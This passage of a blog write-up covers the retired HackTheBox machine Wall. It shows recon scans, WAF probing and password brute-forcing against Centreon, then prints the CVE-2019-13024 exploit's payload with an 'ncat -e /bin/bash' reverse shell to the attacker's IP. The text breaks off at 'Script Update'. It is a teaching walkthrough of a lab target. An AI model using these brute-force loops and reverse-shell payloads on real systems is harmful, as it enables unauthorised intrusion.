@@ -1,0 +1,892 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Wall</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-wall">htb-wall</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#gobuster">gobuster</a> <a class="post-tag" href="/tags#hydra">hydra</a> <a class="post-tag" href="/tags#centreon">centreon</a> <a class="post-tag" href="/tags#cve-2019-13024">cve-2019-13024</a> <a class="post-tag" href="/tags#waf">waf</a> <a class="post-tag" href="/tags#filter">filter</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#uncompyle6">uncompyle6</a> <a class="post-tag" href="/tags#screen">screen</a> <a class="post-tag" href="/tags#modsecurity">modsecurity</a> <a class="post-tag" href="/tags#htaccess">htaccess</a> <a class="post-tag" href="/tags#htb-flujab">htb-flujab</a> </span><br/><br/>
+<time class="dt-published" datetime="2019-12-07T13:45:00+00:00" itemprop="datePublished">Dec 7, 2019
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2019/12/07/htb-wall.html" style="color: #e6e6e6; text-decoration: none;">HTB: Wall</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/wall-cover.webp" type="image/webp"/>
+<img alt="Wall" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/wall-cover.png" style="float: right;margin-right:50px; margin-left:50px; width:120px; height:120px;">
+</img></picture>
+<p>Wall presented a series of challenges wrapped around two public exploits. The first exploit was a CVE in Centreon software. But to find it, I had to take advantage of a misconfigured webserver that only requests authenticatoin on GET requests, allowing POST requests to proceed, which leads to the path to the Centreon install. Next, I’ll use the public exploit, but it fails because there’s a WAF blocking requests with certain keywords. I’ll probe to identify the blocks words, which includes the space character, and use the Linux environment variable ${IFS} instead of space to get command injection. Once I have that, I can get a shell on the box. There’s a compiled Python file in the users home directory, which I can decompile to find the password for the second user. From either of these users, I can exploit SUID screen to get a root shell. In Beyond Root, I’ll look at the webserver configuration, the WAF, improve the exploit script, and look at some trolls the author left around.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/208 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/wall" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Wall</a> <a href="https://hackthebox.com/machines/wall" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-wall.webp" type="image/webp"/> <img alt="Wall" class="img-av" src="/icons/box-wall.png"/></picture></a><br/><a href="https://hackthebox.com/machines/wall" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1172496633524903936">14 Sep 2019</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">07 Dec 2019</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/wall-diff.webp" type="image/webp"/><img alt="Rated difficulty for Wall" src="/img/wall-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/wall-radar.webp" type="image/webp"/><img alt="Radar chart for Wall" src="/img/wall-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">02:17:37</span><a href="https://app.hackthebox.com/users/103578" rel="noopener" target="_blank"><img alt="qtc" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/103578" style="display: unset"/><span class="user-text" style="display: none"> qtc</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">02:17:18</span><a href="https://app.hackthebox.com/users/103578" rel="noopener" target="_blank"><img alt="qtc" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/103578" style="display: unset"/><span class="user-text" style="display: none"> qtc</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/17292" rel="noopener" target="_blank"><img alt="askar" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/17292" style="display: unset"/><span class="user-text" style="display: none"> askar</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> returns a very typical combination of services, ssh (22) and http (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.157
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-14 15:02 EDT
+Warning: 10.10.10.157 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.157
+Host is up (0.19s latency).
+Not shown: 42968 closed ports, 22565 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 54.94 seconds
+</span><span class="gp">root@kali# </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,80 <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.157 
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-14 15:03 EDT
+Nmap scan report for 10.10.10.157
+Host is up (0.071s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
+|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
+|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.41 seconds
+
+</span></code></pre></div></div>
+<p><a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> and <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> versions both point to Ubuntu Bionic (18.04).</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>Gives a default Apache page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1568527824387.webp" type="image/webp"/>
+<img alt="1568527824387" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1568527824387.png"/>
+</picture>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p><code class="language-plaintext highlighter-rouge">gobuster</code> returns a couple paths / files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.157 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> php,txt <span class="nt">-t</span> 40
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.157
+[+] Threads:        40
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,txt
+[+] Timeout:        10s
+===============================================================
+2019/09/14 15:06:07 Starting gobuster
+===============================================================
+/aa.php (Status: 200)
+/monitoring (Status: 401)
+/panel.php (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2019/09/14 15:53:08 Finished
+===============================================================
+</span></code></pre></div></div>
+<h4 id="php-pages">php Pages</h4>
+<p>Both <code class="language-plaintext highlighter-rouge">aa.php</code> and <code class="language-plaintext highlighter-rouge">panel.php</code> don’t return anything interesting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl 10.10.10.157/aa.php
+<span class="go">1
+</span><span class="gp">root@kali# </span>curl 10.10.10.157/panel.php
+<span class="go">Just a test for php file !
+</span></code></pre></div></div>
+<p>Because there was no where else to look, I spent some time trying to fuzz parameters at both of these. I didn’t discover any parameters for GET or POST, but I did see some 403s come back when I posted:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>wfuzz <span class="nt">-c</span> <span class="nt">-u</span> http://10.10.10.157/panel.php <span class="nt">-d</span> <span class="s1">'FUZZ=0xdf'</span> <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt <span class="nt">--hh</span> 26
+<span class="go">
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://10.10.10.157/panel.php
+Total requests: 2588
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000160:   403        11 L     32 W     296 Ch      "hostname"
+000000435:   403        11 L     32 W     296 Ch      "passwd"
+
+Total time: 28.51029
+Processed Requests: 2588
+Filtered Requests: 2586
+Requests/sec.: 90.77422
+</span></code></pre></div></div>
+<p>In fact, when I post with either of these phrases to even static pages, it comes back 403:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl http://10.10.10.157 <span class="nt">-d</span> <span class="s2">"hostname"</span>
+<span class="go">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access /
+on this server.&lt;br /&gt;
+&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+<p>So there is some kind of web application firewall (WAF) running here.</p>
+<h4 id="monitoring">/monitoring</h4>
+<p>Visiting <code class="language-plaintext highlighter-rouge">/monitoring</code> prompts for basic auth:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1568528472082.webp" type="image/webp"/>
+<img alt="1568528472082" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1568528472082.png"/>
+</picture>
+<p>I’ll take a hint from the prompt that the username is admin. Finding nothing else, I did kick off a <code class="language-plaintext highlighter-rouge">hydra</code> run against the form:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.157 http-get /monitoring/
+<span class="go">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-15 02:22:39
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
+[DATA] attacking http-get://10.10.10.157:80/monitoring/
+[STATUS] 3019.00 tries/min, 3019 tries in 00:01h, 6981 to do in 00:03h, 16 active
+[STATUS] 3039.50 tries/min, 6079 tries in 00:02h, 3921 to do in 00:02h, 16 active
+[STATUS] 3046.00 tries/min, 9138 tries in 00:03h, 862 to do in 00:01h, 16 active
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-14 16:26:06
+</span></code></pre></div></div>
+<p>While that was running, I did try a post to the path, and it resolved!</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl <span class="nt">-X</span> POST http://10.10.10.157/monitoring/
+<span class="go">&lt;h1&gt;This page is not ready yet !&lt;/h1&gt;
+&lt;h2&gt;We should redirect you to the required page !&lt;/h2&gt;
+
+&lt;meta http-equiv="refresh" content="0; URL='/centreon'" /&gt;
+</span></code></pre></div></div>
+<p>It’s a redirect to <code class="language-plaintext highlighter-rouge">/centreon</code>.</p>
+<h4 id="centreon">/centreon</h4>
+<p>Unsurprisingly this path is running an instance of <a href="https://www.centreon.com/en/">Centreon</a>, an open source infrastructure monitoring software:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1568529023783.webp" type="image/webp"/>
+<img alt="1568529023783" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1568529023783.png"/>
+</picture>
+<p>Based on some googling for default creds, I tried all combinations of “centreon”, “admin”, and “root”, but didn’t get logged in.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="find-exploit">Find Exploit</h3>
+<p>Some googling reveals that not only is there an <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13024">RCE exploit against Centreon v19.04</a>, but it was <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">discovered by Wall’s creator</a>(who it seems forgot to renew his domain at the time of writing, here’s the <a href="https://webcache.googleusercontent.com/search?q=cache:kIxQUrEq9A0J:https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;gl=us&amp;client=ubuntu">Google cached version</a>), and he has <a href="https://github.com/mhaskar/CVE-2019-13024">exploit code on GitHub</a>. That’s a pretty good clue that I’m in the right spot.</p>
+<p>I’ll download the script and take a look. Unfortunately, this exploit requires authentication.</p>
+<h3 id="brute-force-creds">Brute Force Creds</h3>
+<h4 id="hydra">hydra</h4>
+<p>After significantly more enumeration looking for credentials, I set out to try to brute force my way into Centreon. But looking at the POST request to login, there’s a problem:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/centreon/index.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.157</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.10.157/centreon/</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">98</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=jc6r4ut6cq0e9nssnfk8dskaq0</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+useralias=admin&amp;password=admin&amp;submitLogin=Connect&amp;centreon_token=8401dc563787157a951dfea15f0bcf44
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">centreon_token</code> parameter changes on each page load. On a failed login, I see:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"error_msg"</span><span class="nt">&gt;&lt;span</span> <span class="na">class=</span><span class="s">'msg'</span><span class="nt">&gt;</span>Your credentials are incorrect.<span class="nt">&lt;/span&gt;&lt;/div&gt;</span>
+</code></pre></div></div>
+<p>But when I send it to repeater and submit again:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">'msg'</span> <span class="na">align=</span><span class="s">'center'</span><span class="nt">&gt;</span>The form has not been submitted since 15 minutes. Please retry to resubmit<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">''</span> <span class="na">OnLoad = </span><span class="s">windows.location();</span> <span class="na">alt=</span><span class="s">'reload'</span><span class="nt">&gt;</span> here<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
+</code></pre></div></div>
+<p>This is because the token isn’t right. That rules out something like <code class="language-plaintext highlighter-rouge">hydra</code>.</p>
+<h4 id="exploit-script">Exploit Script</h4>
+<p>Looking at the script, it uses <code class="language-plaintext highlighter-rouge">requests</code> to issue five HTTP requests:</p>
+<ul>
+<li>A GET to <code class="language-plaintext highlighter-rouge">/index.php</code> to add the php session cookie to the session and find the token.</li>
+<li>A POST to <code class="language-plaintext highlighter-rouge">/index.php</code> to login. If the login fails, it prints a message and exits.</li>
+<li>A GET to <code class="language-plaintext highlighter-rouge">/main.get.php?p=60901</code> to get a “Poller token”.</li>
+<li>A POST to <code class="language-plaintext highlighter-rouge">/main.get.php?p=60901</code> that includes the payload.</li>
+<li>A GET to <code class="language-plaintext highlighter-rouge">/include/configuration/configGenerate/xml/generateFiles.php</code> to trigger the payload.</li>
+</ul>
+<p>I considered writing my own script to brute force the credentials, but this script already does what I want. I did add <code class="language-plaintext highlighter-rouge">features="lxml"</code> to each of the <code class="language-plaintext highlighter-rouge">BeautifulSoup</code> calls, otherwise there’s a lout error on running.</p>
+<p>I’ll run a <code class="language-plaintext highlighter-rouge">bash</code> for loop over a list of passwords. For each password, I’ll run the exploit script, and pipe the output into <code class="language-plaintext highlighter-rouge">grep</code>. I see in the script that the first thing it does after a successful login is <code class="language-plaintext highlighter-rouge">print("[+] Logged In Sucssfully")</code>. So I’ll <code class="language-plaintext highlighter-rouge">grep</code> for that and then add <code class="language-plaintext highlighter-rouge">&amp;&amp; echo $pass &amp;&amp; break</code>. That means that if the <code class="language-plaintext highlighter-rouge">grep</code> is successful, it will echo the password that worked, and then end the loop.</p>
+<p>All of that runs and gets the password in about four minutes using the <code class="language-plaintext highlighter-rouge">twitter-banned.txt</code> password list:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">time </span><span class="k">for </span>pass <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> /usr/share/wordlists/seclists/Passwords/twitter-banned.txt<span class="si">)</span><span class="p">;</span> <span class="k">do</span> ./centreon-exploit.py http://10.10.10.157/centreon admin <span class="nv">$pass</span> 10.10.14.30 443 | <span class="nb">grep</span> <span class="s2">"Logged In"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nv">$pass</span> <span class="o">&amp;&amp;</span> <span class="nb">break</span><span class="p">;</span> <span class="k">done</span>
+<span class="go">[+] Logged In Sucssfully
+password1
+
+real    3m49.380s
+user    2m22.758s
+sys     0m14.211s
+</span></code></pre></div></div>
+<h4 id="api">API</h4>
+<p>An even better way to do this brute force is to use the <a href="https://documentation.centreon.com/docs/centreon/en/latest/api/api_rest/index.html#authentication">Centreon API</a>. Based on that documentation, I can attempt authentication using the following <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl 10.10.10.157/centreon/api/index.php?action<span class="o">=</span>authenticate <span class="nt">-d</span> <span class="s2">"username=admin&amp;password=admin"</span>
+<span class="go">"Bad credentials"
+</span></code></pre></div></div>
+<p>I can do a similar bash loop, and this time it finds the password in less than a minute:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">time </span><span class="k">for </span>pass <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> /usr/share/wordlists/seclists/Passwords/twitter-banned.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>curl <span class="nt">-s</span> 10.10.10.157/centreon/api/index.php?action<span class="o">=</span>authenticate <span class="nt">-d</span> <span class="s2">"username=admin&amp;password=</span><span class="k">${</span><span class="nv">pass</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">grep </span>authToken <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nv">$pass</span> <span class="o">&amp;&amp;</span> <span class="nb">break</span><span class="p">;</span> <span class="k">done</span>
+<span class="go">{"authToken":"UZVQydKGAqV5v7YfpfHNDepxax\/QiCGW5iiqGOw0iX8="}
+password1
+
+real    0m55.771s
+user    0m3.379s
+sys     0m2.262s
+</span></code></pre></div></div>
+<h3 id="exploit-fails">Exploit Fails</h3>
+<p>Armed with the creds, I opened a <code class="language-plaintext highlighter-rouge">nc</code> listener and ran the exploit script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./centreon-exploit.py http://10.10.10.157/centreon/ admin password1 10.10.14.30 443
+<span class="go">[+] Retrieving CSRF token to submit the login form
+[+] Login token is : 77dc6f59344b11c223b864e612c90cac
+[+] Logged In Sucssfully
+[+] Retrieving Poller token
+[+] Poller token is : e76df3722b39e59e312024617c21b801
+[+] Injecting Done, triggering the payload
+[+] Check you netcat listener !
+</span></code></pre></div></div>
+<p>It seemed to work fine, but I didn’t get a shell.</p>
+<p>I opened the script back up, and took a look at the section where the payload is sent:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">payload_info</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Central</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">ns_ip_address</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span>
+        <span class="c1"># this value should be 1 always
+</span>        <span class="sh">"</span><span class="s">localhost[localhost]</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">is_default[is_default]</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">remote_id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">ssh_port</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">22</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">init_script</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">centengine</span><span class="sh">"</span><span class="p">,</span>
+        <span class="c1"># this value contains the payload , you can change it as you want
+</span>        <span class="sh">"</span><span class="s">nagios_bin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">ncat -e /bin/bash {0} {1} #</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span>
+        <span class="sh">"</span><span class="s">nagiostats_bin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/usr/sbin/centenginestats</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">nagios_perfdata</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/var/log/centreon-engine/service-perfdata</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">centreonbroker_cfg_path</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/etc/centreon-broker</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">centreonbroker_module_path</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/usr/share/centreon/lib/centreon-broker</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">centreonbroker_logs_path</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">centreonconnector_path</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/usr/lib64/centreon-connector</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">init_script_centreontrapd</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">centreontrapd</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">snmp_trapd_path_conf</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/etc/snmp/centreon_traps/</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">ns_activate[ns_activate]</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">submitC</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Save</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">o</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">c</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">centreon_token</span><span class="sh">"</span><span class="p">:</span> <span class="n">poller_token</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="n">send_payload</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">poller_configuration_page</span><span class="p">,</span> <span class="n">payload_info</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Injecting Done, triggering the payload</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>There’s a lot to not like about the way this exploit is written. The payload relies on the insecure <code class="language-plaintext highlighter-rouge">nc</code> with <code class="language-plaintext highlighter-rouge">-e</code> being on the target, and there’s no error checking. I added a print statement just above the last one to print the <code class="language-plaintext highlighter-rouge">send_payload.status_code</code>, and ran again:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./centreon-exploit.py http://10.10.10.157/centreon/ admin password1 10.10.14.30 443
+<span class="go">[+] Retrieving CSRF token to submit the login form
+[+] Login token is : 6e9b4561b4c05180b23c8d0b854ed7a0
+[+] Logged In Sucssfully
+[+] Retrieving Poller token
+[+] Poller token is : 720954a0f1742c2428b9fc9c8c00a670
+[*] Payload inject status code: 403
+[+] Injecting Done, triggering the payload
+[+] Check you netcat listener !
+</span></code></pre></div></div>
+<p>That’s why it’s failing. The injection POST is being blocked by the WAF.</p>
+<p>I emptied out the payload line:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="c1"># this value contains the payload , you can change it as you want
+</span>        <span class="c1">#"nagios_bin": "ncat -e /bin/bash {0} {1} #".format(ip, port),
+</span>        <span class="sh">"</span><span class="s">nagios_bin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span>
+</code></pre></div></div>
+<p>And ran again:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./centreon-exploit.py http://10.10.10.157/centreon/ admin password1 10.10.14.30 443
+<span class="go">[+] Retrieving CSRF token to submit the login form
+[+] Login token is : fe57a7dc6569207997e51a35b33e7a4a
+[+] Logged In Sucssfully
+[+] Retrieving Poller token
+[+] Poller token is : 4654f45a045a9fea5c86d690ae9f02bc
+[*] Payload inject status code: 200
+[+] Injecting Done, triggering the payload
+[+] Check you netcat listener !
+</span></code></pre></div></div>
+<p>It was passed through. Obviously I didn’t get code execution, but now I have a clear task to find a payload that bypasses the WAF and returns a shell.</p>
+<h3 id="script-update">Script Update</h3>
